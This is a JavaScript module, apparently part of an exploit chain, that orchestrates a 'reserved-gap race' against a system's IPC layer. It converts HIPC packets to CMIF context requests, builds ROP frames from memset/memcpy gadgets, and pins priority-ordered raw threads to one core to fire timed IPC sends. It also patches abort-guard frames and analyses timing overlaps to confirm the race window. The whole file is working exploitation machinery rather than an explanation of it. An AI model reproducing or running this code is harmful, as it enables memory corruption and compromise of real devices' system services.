// Wave orchestration helpers for the reserved-gap race.
// Provides: CMIF context wrapping, synchronization gate layout,
//   worker step helpers, frame argument addressing, frame backup/restore,
//   wave execution, and timing/overlap analysis.
// Depends on: constants.js, memory.js, transport.js, decode.js,
//   rop.js, raw-threads.js, format.js

// ── CMIF context wrapping ────────────────────────────────────────
// Apply a CMIF context token to a prepared IPC packet.
// Converts HIPC type 4 (Request) to type 6 (RequestWithContext).
function applyCmifContext(pkt, ctx) {
    var first = Number(read32(pkt)) >>> 0;
    var second = Number(read32(pkt + 4n)) >>> 0;
    var at = 8;
    if (second >>> 31) {
        var special = Number(read32(pkt + 8n)) >>> 0;
        at += 4 + ((special & 1) ? 8 : 0);
        at += 4 * (((special >>> 1) & 15) + ((special >>> 5) & 15));
    }
    at += ((first >>> 16) & 15) * 8;
    at += (((first >>> 20) & 15) + ((first >>> 24) & 15) +
        ((first >>> 28) & 15)) * 12;
    at = (at + 15) & ~15;
    write32(pkt, BigInt(((first & 0xFFFF0000) | 6) >>> 0));
    write32(pkt + BigInt(at + 4), 1n);
    write32(pkt + BigInt(at + 12), BigInt(ctx));
}

// ── Synchronization gate block ───────────────────────────────────
// Allocate and name the gate block used by all wave workers.
// Returns an object with named addresses for every gate and flag.
function createGateBlock() {
    var block = allocPage(0x10000);
    call_rop(GADGET_MEMSET, block, 0n, BigInt(0x10000));
    return {
        block: block,
        masterGate:         block,
        bottleneckDoneGate: block + 0x100n,
        groupReleasedGate:  block + 0x200n,
        guardLaunchedGate:  block + 0x300n,
        bottleneckFinished: block + 0x400n,
        completedFlag:      block + 0x500n,
        earlyHole:          block + 0x600n,
        sampledCompleted:   block + 0x700n,
        sampledEarlyHole:   block + 0x800n,
        zeroByte:              block + 0x900n,
        spacingDecision:       block + 0xA00n,
        roleDoneFlags:         block + 0xB00n
    };
}

// ── Worker step helpers ──────────────────────────────────────────
// Each returns a call descriptor for buildRawFrame.
function WAIT(addr)       { return { fn: F_WaitForAddress,  args: [addr, 0n, 1n, 5000000000n] }; }
function SIGNAL(addr)     { return { fn: F_SignalToAddress,  args: [addr, 1n, 0n, 0x7FFFFFFFn] }; }
function SLEEP(ns)        { return { fn: F_Sleep,            args: [BigInt(ns), 0n, 0n, 0n] }; }
function TICK()           { return { fn: F_Tick,             args: [0n, 0n, 0n, 0n] }; }
function SEND(pkt, handle){ return { fn: IPC_SEND_DISPATCHER,args: [BigInt(handle), pkt, 0x1000n, 0n] }; }
function SETB(dst, val)   { return { fn: GADGET_MEMSET,      args: [dst, BigInt(val), 1n, 0n] }; }
function MCPY(dst, src, len){ return { fn: GADGET_MEMCPY,    args: [dst, src, BigInt(len), 0n] }; }

// ── Frame argument slot ──────────────────────────────────────────
// Compute the address of a specific argument within a ROP frame.
// Used to patch frame contents between waves (e.g. swapping handles).
function frameArgSlot(frameAddr, count, stepIndex, argIndex) {
    var tables = 0x1000;
    var s = (Math.ceil((tables + count * 0x100) / 0x1000) * 0x1000) + 0x10000;
    var FSTEP = 0x140;
    if (argIndex === 0) {
        if (stepIndex === 0) return frameAddr + 0x30n;
        return frameAddr + BigInt(s + (stepIndex - 1) * FSTEP + 0xe8);
    }
    var sp = s + stepIndex * FSTEP;
    if (argIndex === 1) return frameAddr + BigInt(sp + 0x10);
    if (argIndex === 2) return frameAddr + BigInt(sp + 0x20);
    return frameAddr + BigInt(sp + 0x28);
}

// ── Frame backup and restore ─────────────────────────────────────

// Build frames from plans, apply trigger abort-guard patches,
// and save backups. Returns { frames, backups, pktBackups }.
//
// plans:    array of step arrays (from buildPlans)
// packets:  array of REQ packet addresses
// triggerBuf: address of the trigger's first slot buffer
// sendIndices: array of 13 last-SEND step indices
function buildWaveFrames(plans, packets, triggerBuf, sendIndices) {
    var frames = plans.map(function(p) { return buildRawFrame(p); });

    // Trigger frame (role 12): wire abort-guard copy-to-length patches.
    // Each abort-guard pair is MCPY(0n, flag, 4) followed by
    // MCPY(triggerBuf, zeroByte, 0). The first MCPY's dst (0n) is
    // patched to point at the second MCPY's length slot, so the
    // sampled flag value becomes the copy length at runtime.
    // Find them dynamically: any MCPY with dst === 0n is an abort-guard.
    var tf = frames[12].frame;
    var tc = frames[12].count;
    var triggerPlan = plans[12];
    for (var j = 0; j < triggerPlan.length - 1; j++) {
        if (triggerPlan[j].fn === GADGET_MEMCPY &&
            triggerPlan[j].args[0] === 0n) {
            write64(frameArgSlot(tf, tc, j, 0),
                frameArgSlot(tf, tc, j + 1, 2));
        }
    }

    var frameBackups = [];
    for (var i = 0; i < 13; i++) {
        var bk = allocPage(frames[i].size);
        call_rop(GADGET_MEMCPY, bk, frames[i].frame, BigInt(frames[i].size));
        frameBackups.push(bk);
    }

    var pktBackups = [];
    for (var i = 0; i < 13; i++) {
        var bk = allocPage(0x2000);
        call_rop(GADGET_MEMCPY, bk, packets[i], 0x1000n);
        pktBackups.push(bk);
    }

    return { frames: frames, backups: frameBackups, pktBackups: pktBackups };
}

// Allocate reusable per-worker buffers (stack, handleBuf, waitBuf).
function allocWorkerResources(count) {
    var resources = [];
    for (var i = 0; i < (count || 13); i++) {
        resources.push({
            stack: allocPage(RAW_THREAD_STACK_SIZE),
            handleBuf: allocPage(0x10),
            waitBuf: allocPage(0x20)
        });
    }
    return resources;
}

// Reset all wave state: gates, packets, frames, trigger buffer.
// extraBackups: { packets: [{pkt, backup}], triggerBuf, triggerFirstByte }
function resetWaveState(frames, backups, packets, pktBackups, gates, extra) {
    call_rop(GADGET_MEMSET, gates.block, 0n, BigInt(0x10000));

    for (var k = 0; k < 13; k++)
        call_rop(GADGET_MEMCPY, packets[k], pktBackups[k], 0x1000n);

    if (extra && extra.packets) {
        for (var k = 0; k < extra.packets.length; k++)
            call_rop(GADGET_MEMCPY, extra.packets[k].pkt, extra.packets[k].backup, 0x1000n);
    }

    if (extra && extra.triggerBuf)
        write8(extra.triggerBuf, BigInt(extra.triggerFirstByte || 0x2F));

    for (var k = 0; k < 13; k++)
        call_rop(GADGET_MEMCPY, frames[k].frame, backups[k], BigInt(frames[k].size));
}

// ── Wave execution ───────────────────────────────────────────────

// Run one wave: create, start, signal, poll, join all workers.
// workerRoles lists the active slot indices (e.g. [0,1,2,3,4,5,6,9,10,11,12]).
// Priorities are assigned contiguously in workerRoles order so the
// kernel scheduler fires them deterministically on a single core.
// Returns { created, pinned, started, done, joined, workerStateSafe, workers }
function executeWave(frames, scheduling, resources, gates, sendIndices,
    workerRoles) {

    var pinCore = scheduling.core;
    var workerCount = workerRoles.length;

    var workers = new Array(13);
    var createFailed = false;
    for (var wi = 0; wi < workerCount; wi++) {
        var role = workerRoles[wi];
        workers[role] = createRawWorker(frames[role].frame,
            { priority: scheduling.priority + wi, core: pinCore },
            resources[role]);

        if (workers[role].rc !== 0) {
            createFailed = true;
            break;
        }
    }

    var created = 0;
    for (var wi = 0; wi < workerCount; wi++) {
        if (workers[workerRoles[wi]] &&
            workers[workerRoles[wi]].rc === 0) created++;
    }

    if (created < workerCount) {
        for (var wi = 0; wi < workerCount; wi++) {
            var w = workers[workerRoles[wi]];
            if (w && w.rc === 0 && w.handle)
                closeRawThread(w.handle);
        }

        return {
            created: created, pinned: 0, started: 0, done: 0, joined: 0,
            workerStateSafe: true, workers: workers };
    }

    // Set a single-core affinity mask before any worker can run.
    var pinned = 0;
    for (var wi = 0; wi < workerCount; wi++) {
        var pinRc = pinWorkerToCore(
            workers[workerRoles[wi]].handle, pinCore);
        if (pinRc === 0) pinned++;
    }

    if (pinned < workerCount) {
        for (var wi = 0; wi < workerCount; wi++) {
            closeRawThread(workers[workerRoles[wi]].handle);
        }

        return {
            created: created, pinned: pinned,
            started: 0, done: 0, joined: 0,
            workerStateSafe: true, workers: workers
        };
    }

    var started = 0;
    for (var wi = 0; wi < workerCount; wi++) {
        if (startRawWorker(workers[workerRoles[wi]]) === 0) started++;
    }

    if (started < workerCount) {
        write8(gates.block, 0n);
        call_rop(F_SignalToAddress, gates.masterGate, 1n, 0n, 0x7FFFFFFFn);
        var safe = true;
        for (var wi = 0; wi < workerCount; wi++) {
            var role = workerRoles[wi];
            if (!workers[role].handle) continue;

            if (!workers[role].started) {
                closeRawThread(workers[role].handle);
                continue;
            }

            var rc = waitRawThread(workers[role].handle, 5000000000n,
                resources[role].waitBuf);
            if (rc === 0) closeRawThread(workers[role].handle);
            else safe = false;
        }

        return { created: created, pinned: pinned, started: started,
            done: 0, joined: 0,
            workerStateSafe: safe, workers: workers };
    }

    // Let workers settle at their gates. Single core, priority-ordered:
    // workers reach WAIT(masterGate) within microseconds. 2ms is plenty.
    call_rop(F_Sleep, 2000000n);
    var signalResult = call_rop(F_SignalToAddress,
        gates.masterGate, 1n, 0n, 0x7FFFFFFFn);
    var waveT0 = call_rop(F_Tick);

    // Poll for all active workers to finish their last SEND.
    var done = 0;
    for (var iter = 0; iter < 30000; iter++) {
        done = 0;
        for (var wi = 0; wi < workerCount; wi++) {
            var role = workerRoles[wi];

            if (sendIndices[role] < 0 ||
                readFrameResult(frames[role].frame,
                    sendIndices[role]) !== FRAME_SENTINEL) {
                done++;
            }
        }

        if (done === workerCount) break;
        if (call_rop(F_Tick) - waveT0 > 480000000n) break;
        call_rop(F_Sleep, 200000n);
    }

    // Join all active threads.
    var joined = 0;
    var safe = true;
    for (var wi = 0; wi < workerCount; wi++) {
        var role = workerRoles[wi];
        var rc = waitRawThread(workers[role].handle, 5000000000n,
            resources[role].waitBuf);

        if (rc === 0) {
            closeRawThread(workers[role].handle);
            joined++;
        } else {
            safe = false;
        }
    }

    return {
        created: created, pinned: pinned, started: started,
        done: done, joined: joined,
        workerStateSafe: safe, workers: workers, waveT0: waveT0,
        signalResult: signalResult
    };
}

// ── Timing and overlap analysis ──────────────────────────────────

// Collect send-interval spans from frame results.
// Returns array of { name, start, end } for each role whose SEND completed.
function collectSpans(frames, sendIndices, roleLabels) {
    var spans = [];
    for (var i = 0; i < sendIndices.length; i++) {
        if (sendIndices[i] < 0) continue;

        var pre = readFrameResult(frames[i].frame, sendIndices[i] - 1);
        var post = readFrameResult(frames[i].frame, sendIndices[i] + 1);
        if (pre === FRAME_SENTINEL || post === FRAME_SENTINEL) continue;
        spans.push({ name: roleLabels[i], start: pre, end: post });
    }
    return spans;
}

// Find a named span.
function getSpan(spans, name) {
    for (var i = 0; i < spans.length; i++)
        if (spans[i].name === name) return spans[i];
    return null;
}

// Qualify the overlap window: check which overlapRoles have the right
// timing relationship with the trigger span.
// throughRoles: must start before trigger.start AND end after trigger.end
// heldRoles: must start before trigger.start AND end after trigger.start
//
// Returns { shapeCount, shapeMissing[], pendingDuring[], receiveMarginUs }
function qualifyOverlap(spans, trigSpan, overlapRoles, throughRoles, heldRoles) {
    if (!trigSpan) return { shapeCount: 0, shapeMissing: [], pendingDuring: [],
        receiveMarginUs: null };

    var pendingDuring = [];
    for (var i = 0; i < spans.length; i++) {
        var s = spans[i];
        if (s.name !== "trigger" && s.start <= trigSpan.start && s.end >= trigSpan.end)
            pendingDuring.push(s.name);
    }

    var shapeMissing = overlapRoles.filter(function(name) {
        var span = getSpan(spans, name);
        if (!span || !(span.start < trigSpan.start)) return true;
        return throughRoles.indexOf(name) >= 0
            ? !(trigSpan.end < span.end)
            : !(trigSpan.start < span.end);
    });

    var holeSpan = getSpan(spans, "bottleneck");
    var guard1Span = getSpan(spans, "guard1");
    var receiveMarginUs = (holeSpan && guard1Span)
        ? ticksToUs(holeSpan.end - guard1Span.start) : null;

    return {
        shapeCount: overlapRoles.length - shapeMissing.length,
        shapeMissing: shapeMissing,
        pendingDuring: pendingDuring,
        receiveMarginUs: receiveMarginUs
    };
}

// Find the index of the last SEND step in a plan.
function findLastSendIndex(plan) {
    var last = -1;
    for (var k = 0; k < plan.length; k++) {
        if (plan[k].fn === IPC_SEND_DISPATCHER) last = k;
    }
    return last;
}

// Find the index of the SEND step for a specific packet.
function findSendForPacket(plan, packet) {
    for (var k = 0; k < plan.length; k++) {
        if (plan[k].fn === IPC_SEND_DISPATCHER && plan[k].args[1] === packet)
            return k;
    }
    return -1;
}

// Read a role's send transport code (0 = success, or error).
function roleSendCode(frames, role, sendIndex) {
    if (sendIndex < 0) return null;
    var value = readFrameResult(frames[role].frame, sendIndex);
    return value === FRAME_SENTINEL ? null : (Number(value) >>> 0);
}
